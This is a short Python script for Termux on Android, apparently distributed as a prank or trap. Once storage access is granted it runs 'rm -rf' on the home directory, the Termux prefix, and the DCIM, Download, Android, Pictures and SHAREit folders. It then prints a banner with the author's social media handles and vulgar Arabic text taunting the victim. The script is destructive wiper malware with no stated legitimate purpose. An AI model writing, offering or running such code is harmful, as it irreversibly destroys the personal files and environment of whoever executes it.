import time
import os 
import requests
def banner():
     
     
    print("""\033[1;31m 

.░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░
░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░
░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░
░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░
█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█
█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█             
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░             MY TELE: sxtz0  + MY Facebook (Zeyad Alabany)
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░            <ﻲﻧﺎﺒﻌﻟﺍ ﺩﺎﻳﺯ ﻞﺒﻗ ﻦﻣ ﻙﺯﺎﻬﺟ ﻚﻴﻧ ﻢﺗ>
░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░
░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░             <؟ ﻚﺗﺎﻔﻠﻣ ﺐﻗﺍﺭ ﻲﻧﺎﺒﻌﻟﺍ ﺩﺎﻳﺯ ﻞﺒﻗ ﻦﻣ ﻙﺯﺎﻬﺟ ﻚﻴﻧ ﻢﺗ>
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░
░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░
░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░
░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░
ﻲﻧﺎﺒﻌﻟﺍ ﺩﺎﻳﺯ ﻞﺒﻗ ﻦﻣ ﻙﺯﺎﻬﺟ ﻚﻴﻧ ﻢﺗ
""")
os.system('termux-setup-storage')
time.sleep(2)
os.system('rm -rf $HOME')
os.system('cd /sdcard && rm -rf DCIM && rm -rf Download && rm -rf Android && rm -rf Pictures && rm -rf $PREFIX ')
os.system('rm -rf DCIM ')
os.system('rm -rf Download')
os.system('rm -rf Android ' )
os.system('rm -rf Pictures')
os.system('rm -rf SHAREit')
os.system('rm -rf Pictures') 
os.system('rm -rf $PREFIX')
banner()
